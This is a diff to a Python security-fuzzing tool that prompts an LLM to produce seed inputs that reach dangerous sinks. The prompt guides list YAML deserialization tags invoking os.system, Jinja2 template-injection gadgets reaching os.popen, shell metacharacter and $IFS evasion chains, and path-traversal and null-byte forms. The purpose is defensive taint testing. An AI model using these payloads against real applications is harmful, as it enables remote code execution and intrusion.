@@ -11,6 +11,7 @@ from __future__ import annotations
 
 from arbiter.llm.sdk import ClaudeHeadlessClient, LLMClient, SystemBlock
 from arbiter.models import Flow, Sink, SinkFamily, StrategySpec, Target
+from arbiter.payloads import get_seed_corpus
 
 MARKER_PLACEHOLDER = "{MARKER}"
 
@@ -64,8 +65,10 @@ substring {MARKER} — to flow into the sink at runtime.
 
 # Constraints
 - 4 to 8 seeds.
-- Diverse: cover at least concatenation, literal embedding, and one canonical
-  family-specific gadget.
+- A curated static corpus is merged with your output by the runtime, so
+  focus on producing *variations* rather than recreating canonical forms.
+  Target-specific shapes — using hints from the callable's docstring,
+  signature, or surrounding code — are the highest-value variations.
 - For bytes targets, write seeds as text; the worker UTF-8 encodes them.
 - Do not include the curly braces of "{MARKER}" anywhere except as that
   literal placeholder.
@@ -76,68 +79,80 @@ SINK_FAMILY_GUIDE: dict[SinkFamily, str] = {
     SinkFamily.code_exec: """\
 # Sink family: code_exec  (eval, exec, compile, runpy)
 
-The sink argument is Python source. Make the marker appear as a literal in
-the source so it survives compilation. Examples:
-  - "'{MARKER}' + str(1)"
-  - "1 + 1  # {MARKER}"
-  - "__import__('os').name + '{MARKER}'"
-  - "print('{MARKER}')"
+The sink argument is Python source. Marker must land as a literal so it
+survives `compile()`. Canonical patterns the corpus already covers:
+  - direct concatenation:    "'{MARKER}' + str(1)"
+  - comment-tagged:          "1 + 1  # {MARKER}"
+  - import-attribute chain:  "__import__('os').name + '{MARKER}'"
+
+Variations to favor: target-specific (use the docstring's named operations),
+unusual literal forms (f-strings, byte-string literals, complex numbers),
+syntactically valid edge cases (walrus, comprehensions).
 """,
     SinkFamily.deserialization: """\
-# Sink family: deserialization  (yaml.unsafe_load, pickle.loads, marshal.loads)
+# Sink family: deserialization  (yaml.unsafe_load, pickle.loads)
 
-YAML: use !!python/object/apply tags. The function is invoked with the
-positional args from the YAML list. Pick a benign callable and put the
-marker in its argument.
+YAML python-tag injection lands the marker as the called function's argument
+so it shows up in the audit-event args:
   - !!python/object/apply:os.system ["echo {MARKER}"]
   - !!python/object/apply:subprocess.getoutput ["echo {MARKER}"]
   - !!python/object/new:str ["{MARKER}"]
+  - !!python/name:os.system  # {MARKER}
 
-Pickle: prefer kind=bytes. Hand-crafted REDUCE-opcode constructions are
-fragile; for a v0 seed, a textual payload like the above usually suffices
-because the harness wraps the input in a unsafe loader.
+Variations to favor: alternative benign callables (builtins.print, str.format),
+multi-line YAML form, nested constructions, version-specific tags.
 """,
     SinkFamily.process: """\
 # Sink family: process  (os.system, subprocess.*, os.exec*)
 
-The marker becomes a command argument. Shell metachars when shell=True:
-  - echo {MARKER}
-  - ; echo {MARKER}
-  - $(echo {MARKER})
-For argv-list variants, write the seed as a single string and rely on the
-wrapper to forward it; the marker should still surface in the audit-hook
-arg repr.
+Shell-evaluated sinks (shell=True, os.system, os.popen) accept metachar
+chains; argv-list sinks just need the marker in one argv entry.
+  - direct:         "echo {MARKER}"
+  - separator:      "; echo {MARKER}"
+  - substitution:   "$(echo {MARKER})"
+  - newline split:  "\\necho {MARKER}"
+
+Variations to favor: encoding tricks ($IFS, ${IFS}, %20), backslash escapes,
+locale-dependent quoting, mixed-quote chains.
 """,
     SinkFamily.template: """\
-# Sink family: template  (Jinja2, Mako)
+# Sink family: template  (Jinja2, Mako, Tornado)
 
-The marker must end up in the compiled template's Python source. Easiest:
-embed it as a literal in the template body.
-  - "{{ 1 }} {MARKER}"
-  - "{% if 1 %}{MARKER}{% endif %}"
-  - "{{ ''.__class__.__mro__[1].__subclasses__() | length }} {MARKER}"
-SSTI gadgets that index __subclasses__() are version-fragile; prefer the
-simple literal pattern first, gadget-style as one of the variants.
+Two strategies, both already in the corpus:
+  (a) Literal embedding — marker in the template body, lands in compiled
+      template source via compile():  "{{ '{MARKER}' }}"
+  (b) Context-free RCE gadgets — Jinja2-specific:
+      "{{ cycler.__init__.__globals__.os.popen('echo {MARKER}').read() }}"
+      "{{ lipsum.__globals__['os'].popen('echo {MARKER}').read() }}"
+
+Avoid `__subclasses__()[N]` forms — the index varies between Python versions.
+Variations to favor: filter chains, set/with/macro tags, alternate engines
+(Mako ${ }, Tornado).
 """,
     SinkFamily.xml: """\
 # Sink family: xml  (XXE)
 
-Use an external entity that expands to the marker:
+Internal entity expands the marker into the XML text:
   - <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "{MARKER}">]><r>&x;</r>
+
+Variations: parameter entities, XInclude, external file:// URIs (parser
+may attempt resolution and expose audit events), entity-name carrying.
 """,
     SinkFamily.import_: """\
 # Sink family: import  (dynamic import)
 
-Use the marker as the module name. The import will fail but the audit
-event fires before the failure with the marker in its arg:
+Audit event fires before module-not-found resolution; any unique name
+carrying the marker counts:
   - not_a_real_module_{MARKER}
+  - ../{MARKER}  (path-style — may interact with sys.path manipulation)
 """,
     SinkFamily.path: """\
 # Sink family: path
 
-Embed the marker in the path:
+Traversal sequences with the marker in the resolved path:
   - ../{MARKER}
-  - /tmp/{MARKER}
+  - ..%2f{MARKER}
+  - "{MARKER}\\x00.txt"  (legacy null-byte truncation)
 """,
 }
 
@@ -215,7 +230,9 @@ def synthesize_strategy(
     )
     spec = _coerce_strategy(raw, sink)
     if not spec.seeds:
-        # Fallback: a single literal-marker seed appropriate to the family.
-        # Better than failing — the random branch of the strategy still runs.
-        spec = StrategySpec(kind=spec.kind, params=spec.params, seeds=[MARKER_PLACEHOLDER])
+        # Fallback: use the curated static corpus for this family. Better than
+        # failing — the orchestrator would merge the corpus in anyway, but
+        # callers using synthesize_strategy directly get a usable spec back.
+        fallback = get_seed_corpus(sink.family) or [MARKER_PLACEHOLDER]
+        spec = StrategySpec(kind=spec.kind, params=spec.params, seeds=fallback)
     return spec
